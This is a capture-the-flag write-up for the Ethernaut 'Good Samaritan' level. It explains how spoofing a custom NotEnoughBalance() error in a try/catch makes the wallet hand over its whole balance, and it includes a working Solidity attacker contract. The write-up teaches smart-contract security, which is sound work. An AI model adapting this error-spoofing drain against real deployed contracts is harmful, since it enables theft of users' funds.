# Ethernaut #27 — Good Samaritan

## Challenge
A `GoodSamaritan` wallet that donates to "poor" contracts. Exploit it to drain funds.

## Vulnerability
**Custom Error Manipulation** — The contract uses a try/catch with custom errors. If the recipient reverts with `NotEnoughBalance()`, the catch block changes behavior.

## The Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GoodSamaritanExploit {
    error NotEnoughBalance();
    
    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
    
    function exploit(address goodSamaritan) external {
        // Request donation - small amount triggers our revert
        GoodSamaritan(goodSamaritan).requestDonation();
    }
}
```

## The Flow
1. We call `requestDonation()` 
2. Contract transfers 10 tokens → calls `notify(10)` on us
3. We revert with `NotEnoughBalance()` 
4. Catch block calls `transferRemainder()` — drains entire balance to us

## Key Insight
**Custom errors as control flow.** The "security" feature (checking if recipient has enough) becomes the attack vector. When the check fails "unexpectedly", the fallback is generous.

## The Lesson
Catch blocks that handle errors with alternative flows are dangerous. Especially when the error can be triggered by the attacker.

**Status:** Ready for execution
